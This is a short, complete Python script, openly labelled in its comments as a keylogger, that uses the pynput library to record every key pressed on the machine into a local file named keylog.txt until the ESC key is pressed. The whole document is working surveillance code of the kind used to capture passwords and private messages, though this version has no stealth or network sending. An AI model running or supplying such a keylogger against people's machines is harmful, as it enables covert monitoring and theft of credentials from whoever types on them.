from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        # For alphanumeric keys, write the character directly
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # For special keys (like space, enter, shift), format them cleanly
        with open(log_file, "a") as f:
            f.write(f' [{key}] ')

def on_release(key):
    # Stop the keylogger when the ESC key is pressed
    if key == Key.esc:
        return False

# Set up the listener and keep it running
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
